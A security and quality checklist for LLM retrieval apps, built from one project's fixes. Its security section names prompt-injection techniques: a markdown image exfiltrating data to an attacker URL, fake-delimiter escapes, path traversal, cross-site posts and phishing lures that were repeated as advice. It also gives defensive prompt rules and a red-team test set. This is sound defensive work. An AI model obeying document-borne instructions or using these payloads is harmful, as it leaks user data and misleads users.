# Quality Requirements Checklist for LLM / RAG Applications

A reusable list of quality requirements, drawn from the improvements made to
BakeFix (V4). Use it to review a different project: each requirement says
**what** to look for, **why** it matters (with the problem we actually found),
and **how to check** it.

**Priority:** **MUST** = a missing item is a real defect or risk.
**SHOULD** = expected in a product people use every day. **COULD** = polish.

---

## 1. Observability (traces)

- [ ] **MUST: Every user request that reaches the model produces one trace**, including invalid
      requests, refusals, and failures, not only successful answers.
      *Why:* failures are exactly the cases you need to explain.
      *Check:* send an invalid request, an off-topic question, and a request that crashes; each has a stored trace.
- [ ] **MUST: Every operation that changes the index or knowledge base is traced** (upload, delete,
      settings change, approving or rejecting a held document).
      *Check:* each of these returns a trace ID.
- [ ] **MUST: The trace ID reaches the client on errors too** (e.g. an `X-Trace-ID` header), so the
      UI can link a failure to its trace.
      *Found:* an unexpected crash returned HTTP 500 without the header; the stored trace was unreachable from the UI.
      *Check:* force an exception in the main route; the response still carries the trace ID.
- [ ] **MUST: Traces record enough to explain a wrong answer from the trace alone:** retrieval settings,
      each retrieved passage with rank, score, source, and which retriever found it; model; tokens; cost;
      validation outcome.
      *Check:* pick a wrong answer and try to explain it using only its trace.
- [ ] **MUST: Traces never store personal or secret data:** no question text, prompt, document or chunk
      text, API keys. Use counts instead of names where possible.
      *Check:* search a stored trace for the question's words and for document text; enforce with a
      forbidden-key list in code and a test.
- [ ] **MUST: Trace attributes are flat and bounded** (simple types, length limit) so they cannot
      smuggle in large text.
- [ ] **MUST: Retention is defined and enforced** (e.g. 30 days, purged automatically).
- [ ] **SHOULD: Storage choice is justified:** local file/DB for a local app; who can read traces and
      whether they leave the machine is stated.
- [ ] **SHOULD: One shared "details" view in the UI** for every traced action, with steps, durations,
      and retrieved passages grouped and readable (rounded numbers, not floating-point noise).
- [ ] **SHOULD: A background rebuild triggered by a request is recorded inside that request's trace**,
      not as a separate trace the user never sees.

## 2. Error handling

- [ ] **MUST: Every error response has one JSON shape**, e.g. `{error: {code, message, retryable}}`,
      including validation errors and unexpected crashes.
      *Found:* crashes returned plain-text "Internal Server Error", which the frontend could not parse.
      *Check:* trigger a 422, a 404, a 409, and a forced 500; all are JSON in the same shape.
- [ ] **MUST: Crash responses never contain exception text** (it can contain file paths or user data).
      *Check:* raise an exception containing a fake path; it must not appear in the response.
- [ ] **MUST: "Server unreachable" is recognised and explained.** A network failure (`Failed to fetch`)
      or a non-JSON 5xx from a proxy means the backend is down; the UI should say so and say what to do.
      *Found:* users saw "Failed to fetch" or a vague "Could not load…".
      *Check:* stop the backend and use every screen.
- [ ] **MUST: Backend error codes are mapped to plain messages** that say what to do next
      (e.g. "add your API key to `.env`, then restart"). Developer messages like "Document already
      exists" or "Gemini cited chunk X" are never shown raw.
- [ ] **MUST: Retry is offered only when retrying can help** (timeouts, upstream errors), not for
      configuration or validation errors.
- [ ] **MUST: A correct refusal is never shown as an error.**
      *Found:* the model returned `status: not_found` with an empty answer string; the schema required a
      non-empty answer, so correct refusals became "Something went wrong".
      *Check:* ask clearly off-topic questions against the real model, several times.
- [ ] **MUST: Schemas are strict only where it matters.** Require fields only when the code uses them;
      over-strict validation turns harmless model variations into errors.
- [ ] **SHOULD: One shared helper for request errors** in the frontend instead of each screen handling
      errors its own way.
- [ ] **SHOULD: Upstream outages are expected:** the LLM provider will return 429 (rate limit) and 503
      (overloaded); these get a calm "try again in a moment" message, and evaluation scripts pause and retry.

## 3. Security: defence in depth (LLM-specific)

Design for this threat: *a document contains instructions aimed at the model.*
Each layer must assume the previous one can fail.

### 3.1 Input
- [ ] **MUST: Uploads are validated before anything else:** allowed types only, safe file name (no path
      traversal), encoding checked, empty files refused.
- [ ] **MUST: Upload size is limited before reading the whole file into memory** (e.g. read `limit + 1`
      bytes, refuse with 413).
      *Found:* there was no limit at all. *Check:* upload a file one byte over the limit.
- [ ] **MUST: User input length is limited** (e.g. question ≤ 2,000 characters) on the backend, with
      the same limit and a friendly counter in the UI.
- [ ] **MUST: File-reading endpoints refuse path traversal** (`../../backend/main.py` → 422, no content).

### 3.2 Ingestion screening
- [ ] **SHOULD: Uploaded content is scanned for injection patterns** (instruction overrides, role
      impersonation, secret extraction, exfiltration URLs, fake delimiters), with Unicode normalisation.
- [ ] **SHOULD: Suspicious documents are held, not silently blocked or silently indexed;** they are
      stored outside every indexed folder, and a person decides.
- [ ] **SHOULD: Approval is explicit** (e.g. a checkbox "I've read these passages and trust this
      document" before "Add anyway"); discarding asks for confirmation.
- [ ] **SHOULD: The review screen shows plain-language reasons and short excerpts, never the full
      document text** (the text may contain the attack).
- [ ] **MUST: The scanner's error rate is measured** (labelled set, confusion matrix), and its misses
      are listed.

### 3.3 Prompt construction
- [ ] **MUST: Untrusted text is clearly framed:** each passage inside tags such as
      `<chunk id="…">…</chunk>`, the question inside `<question>…</question>`.
- [ ] **MUST: Untrusted text cannot fake the frame:** tags appearing inside documents, file names,
      graph evidence, or the question are neutralised (e.g. `<chunk` → `&lt;chunk`); attribute values
      cannot break out of their quotes.
      *Check:* a document containing `</chunk><question>…</question>` produces exactly one real chunk
      and one real question in the prompt.
- [ ] **MUST: The prompt states that tagged text is data, never instructions.**
- [ ] **SHOULD: The prompt forbids passing on account / login / password / payment / "visit this site"
      requests found in documents, and forbids links and web addresses in answers.**
      *Found:* a document saying "reset your account first at …" was repeated as advice in 3 of 3
      answers; after this rule, 0 of 3.

### 3.4 Output
- [ ] **MUST: Model output is validated:** structured format (JSON schema); every cited source must
      be one that was actually retrieved; otherwise the answer is not shown.
- [ ] **MUST: Output limits:** maximum output tokens and a short timeout with few retries
      (the OpenAI client defaults to a 10-minute timeout and 2 retries).

### 3.5 Rendering
- [ ] **MUST: Model output and document text are rendered safely:** raw HTML dropped, **images never
      loaded** (a rendered `![](https://attacker/?q=…)` leaks data without a click), links shown as
      text with their address rather than clickable.
      *Check:* render an answer containing an image, a `javascript:` link, and `<img onerror>`; no
      request, no clickable link, no script.
- [ ] **MUST: The same safe renderer is used everywhere** model or document text appears (answers,
      passages, document viewer), not only in the main answer.

### 3.6 API exposure
- [ ] **MUST: Local apps bind to `127.0.0.1` and say "do not expose without authentication".**
- [ ] **MUST: State-changing requests from other websites are refused** (check the `Origin` header on
      POST/PUT/PATCH/DELETE; allow localhost and configured origins).
      *Why:* without it, any web page the user visits can post a form to `localhost` and plant a
      document. *Check:* a request with `Origin: https://evil.example` gets 403 and changes nothing.

### 3.7 Proving the layers work
- [ ] **MUST: The layers behind the scanner are tested end to end against the real model:** put a
      hostile passage in front of the model with a normal question, bypassing retrieval; use a unique
      marker per attack; run each case several times; include a control case; read every answer, not
      only the automatic markers.
      *Found:* automatic markers missed a partially successful attack; reading the answers caught it.
- [ ] **SHOULD: Attack set includes:** known scanner misses, image exfiltration, frame-tag escape,
      encoded (base64) instructions, plausible "fact" lures (phishing), and a plain override.
- [ ] **MUST: Accepted risks are written down** (no login, scanner limits, data sent to the provider,
      traces readable locally, bundled data trusted).

## 4. Privacy (GDPR-minded)

- [ ] **MUST: It is documented exactly what leaves the machine**, to whom, and after which redaction.
- [ ] **MUST: Personal data is redacted from user questions before they are sent to the LLM.**
- [ ] **MUST: Redaction must not break answers:** technical terms, product names, error codes, and team
      names survive. *Found:* "Vellora" and "Turn" were tagged as people; "What is Kestrel?" was altered.
- [ ] **MUST: Redaction effectiveness is measured** on a labelled set: % of personal data caught and % of
      technical terms preserved, with the set's size stated.
- [ ] **SHOULD: Original evidence is kept unmodified locally** for citation checks while only the
      redacted copy goes to the provider.
- [ ] **SHOULD: Users are told not to upload documents they would not share with the provider**, since
      document-level redaction is partial.
- [ ] **SHOULD: Per-user data in the browser (e.g. feedback) stays local** and is bounded in size.

## 5. Supply chain: AI-BOM

- [ ] **MUST: Models are pinned to an exact revision** (e.g. Hugging Face commit), everywhere they
      are loaded (app and evaluation scripts).
      *Found:* the embedding model was unpinned: the Hub could change it, silently changing embeddings
      and making evaluation results unreproducible (it also caused a startup hang).
- [ ] **MUST: Exact dependency versions are recorded** in a lock file (including model wheels with hashes).
- [ ] **SHOULD: An AI-BOM exists** (CycloneDX 1.6 ML-BOM or SPDX 3.0 AI) listing: local models (with
      revision, hash, licence), external AI services (with what data they receive and a trust-boundary
      flag), datasets (with hashes, origin, personal-data status), and all packages.
- [ ] **SHOULD: Model cards in the BOM use the project's own measurements**, flag small sample sizes,
      state training data as published, limitations, trade-offs, and who could be served worse.
- [ ] **SHOULD: The BOM is generated, not hand-written**, deterministic, and validated against the schema.
- [ ] **SHOULD: A test fails when code, lock files, or bundled datasets change without regenerating the
      BOM**, and when the app loads a different model revision than the BOM states.
- [ ] **SHOULD: Known vulnerabilities are scanned** (`pip-audit`, `npm audit`) and **each finding has a
      recorded decision** (VEX: `not_affected` with justification, or `resolved` by upgrading); the scan
      fails on undecided findings.
      *Found:* 4 vulnerabilities only in a server component the app never starts (not affected), 2
      fixable by patch upgrades (upgraded). Reachability was checked at runtime, not assumed.
- [ ] **SHOULD: Hosted models are marked as "pinned by name only"** (the provider can change them).

## 6. Evaluation

- [ ] **MUST: Retrieval is evaluated** with defined metrics (HitRate@k, Recall@k), defined relevance
      labels, and configurations compared only on the same questions.
- [ ] **MUST: Generated answers are evaluated with a stated rubric** (correct / partial / wrong), and
      **re-evaluated after prompt changes**. *Found:* the last grading predated major prompt changes.
- [ ] **MUST: Every safety feature is evaluated, not only described** (scanner, redaction, defence layers).
- [ ] **MUST: Results state sample size and limits;** small sets are "indications, not precise scores".
- [ ] **SHOULD: Each new feature has some evidence it works** (e.g. answer styles: is "short" shorter?
      citations still valid?).
- [ ] **SHOULD: Cost and tokens per answer are summarised** (they are often tracked but never reported).
- [ ] **SHOULD: The demo content is in an evaluation set** (don't demo what you never measured).
- [ ] **SHOULD: Over-refusal is tracked separately** from wrong answers (refusing when the evidence was
      retrieved is a distinct failure).
- [ ] **SHOULD: Raw outputs with personal data are kept out of version control;** only aggregates are committed.
- [ ] **COULD: Usability is tested with people** (a few task-based sessions), or its absence is stated.

## 7. UX: how the product is used

- [ ] **MUST: One clear primary action on the main screen;** developer tools (analytics, evaluation
      runners) are one click away in a secondary area, not equal tabs.
- [ ] **MUST: Technical settings are collapsed by default** ("Search options"), with safe defaults.
- [ ] **MUST: The result comes into view when it arrives.** *Found:* the answer appeared below the fold
      and nothing moved; pressing the button seemed to do nothing. Scroll it into view and move focus to it.
- [ ] **MUST: Every state says what to do next:** loading, empty, failed load, "not found" (with tips),
      error (with retry only when useful).
- [ ] **MUST: Destructive actions ask for inline confirmation** (remove document, discard held document).
- [ ] **MUST: No developer wording in user-facing text:** show readable titles ("Bread not rising" with
      category "Bread") instead of paths (`bread/bread_not_rising.md`); "part 3" instead of "passage 3";
      "text or Markdown file" instead of "(.md or .txt)"; keep the technical value in a tooltip.
- [ ] **MUST: Evidence looks trustworthy:** quotes start and end on whole words (with "…"), without
      metadata lines or URLs. *Found:* "ntensify perceived…" and "Source: https://… Author: …".
- [ ] **MUST: Sources are numbered and visible with every answer**; glossary entries point to their source.
- [ ] **MUST: Copy matches context:** a mode switch (e.g. sample dataset) changes headings, examples,
      placeholders, and footer. *Found:* "Kitchen questions" shown on a software-company sample.
- [ ] **MUST: Labels say what a button does** ("Show the steps behind this answer", not a lone "Details").
- [ ] **SHOULD: No unstyled browser defaults** in a styled page (e.g. "Choose File / No file chosen").
- [ ] **SHOULD: Example questions match the selected knowledge base.**
- [ ] **SHOULD: User preferences that are reader choices (answer style) are separate from search
      settings**, remembered locally, and shown as a readable summary ("for a beginner · friendly · medium").
- [ ] **SHOULD: Each answer states the settings it was produced with**, captured at request time.
- [ ] **SHOULD: Data-quality issues visible to users are acknowledged** (e.g. duplicate or mistyped
      concepts in a graph view) in docs if not fixed.
- [ ] **COULD (day-to-day use): question history, copy answer, "was this helpful?", drag-and-drop upload.**

## 8. Responsive layout and accessibility

- [ ] **MUST: No horizontal scrolling at phone width (390 px), measured with real content**, not only
      on the empty page. *Found:* one long URL in an answer stretched grid cards to 440 px.
      *Fix pattern:* `min-width: 0` on grid/flex children; `overflow-wrap: anywhere` on user/model text.
      *Check:* compare `scrollWidth` with `clientWidth` after an answer is shown.
- [ ] **MUST: Primary content comes first on phones** (question before library).
- [ ] **MUST: Visually hidden inputs stay hidden;** utility classes use `!important` so general rules
      (e.g. `input { width: 100% }`) cannot undo them. *Found:* a hidden file input caused overflow.
- [ ] **MUST: Every control is keyboard reachable with a visible, on-brand focus ring;** non-interactive
      regions that receive focus programmatically show none.
- [ ] **MUST: Dynamic content is announced politely** (`aria-live`), but rotating decorative text is
      hidden from screen readers in favour of one stable message.
- [ ] **MUST: Icon-only buttons have labels** (`aria-label`).
- [ ] **SHOULD: Markdown headings inside answers/passages don't inherit page-title sizes.**

## 9. Motion and delight

- [ ] **MUST: All motion respects `prefers-reduced-motion`** (one global block disabling animations and
      transitions; static alternatives keep every state visible; typed text appears instantly).
- [ ] **SHOULD: Motion has a job:** a loader that shows progress steps, results that reveal in reading
      order, highlights that link a reference to its source, a drop zone that reacts to a dragged file,
      feedback that confirms an action (icon morph on copy).
- [ ] **SHOULD: Motion fits the brand** (e.g. dough rising in a bowl for a kitchen app) and stays short
      (≤ 0.5 s for transitions).
- [ ] **SHOULD: No new dependencies for small effects** (CSS keyframes and a little React state).
- [ ] **SHOULD: Fun effects are tied to user actions** (sprinkles on 👍), never block the UI, and clean up
      their timers.

## 10. Testing and verification

- [ ] **MUST: Every bug fix has a regression test that reproduces the original failure.**
- [ ] **MUST: Prove a check can fail:** a test that guards something (BOM drift, schema validation,
      triage gate) is shown to fail on a deliberate change before it is trusted.
- [ ] **MUST: Verify in the running app, not only in tests:** desktop and phone width, real model,
      main journeys (upload → ask → sources → trace; held document; refusal; error; sample mode).
- [ ] **MUST: Double-check failing checks before reporting them;** a failed check may be wrong itself.
      *Found:* two "failures" in a walkthrough were mistakes in the check scripts.
- [ ] **MUST: Experiments run on isolated copies** (temporary corpus, index, trace DB), never on real data.
- [ ] **SHOULD: Automated suites mock the LLM;** a small separate script exercises the real model.
- [ ] **SHOULD: Frontend typecheck and build run on every change;** a linter config exists.

## 11. Documentation

- [ ] **MUST: The README opens with who the product is for and how to use it** (a short step list),
      before architecture.
- [ ] **MUST: Install and run instructions work on a clean machine**, including model downloads and the
      offline switch (`HF_HUB_OFFLINE=1`) if startup can hang on a network check.
- [ ] **MUST: A settings table lists every environment variable** with default and purpose.
- [ ] **MUST: A security and privacy section** lists the layers, what leaves the machine, and accepted risks.
- [ ] **MUST: Troubleshooting covers the messages users actually see** ("can't reach its server",
      403 from origin check, provider rate limits).
- [ ] **MUST: The report is kept in sync with the code:** fixed issues are marked resolved; new
      evaluations are added to the results index; old "not yet measured" statements are removed.
- [ ] **SHOULD: A decision log records each decision, the reason, and what was rejected.**

## 12. Release process

- [ ] **MUST: Verify that the release tag contains the intended commits before the deadline.**
      *Found:* `final` was first created on `main` before the last PR was merged, so it excluded a
      day's work. *Check:* `git merge-base --is-ancestor <last-commit> final && echo ok`, and run the
      tests on a checkout of exactly the tagged commit.
- [ ] **MUST: Merge teammates' latest work and re-run all checks on the merged result** before tagging.
- [ ] **MUST: Generated artefacts are regenerated after merges that touch their inputs** (e.g. the
      AI-BOM after a new evaluation file).
- [ ] **SHOULD: Post-release work happens on a separate branch** so the tagged submission cannot change.
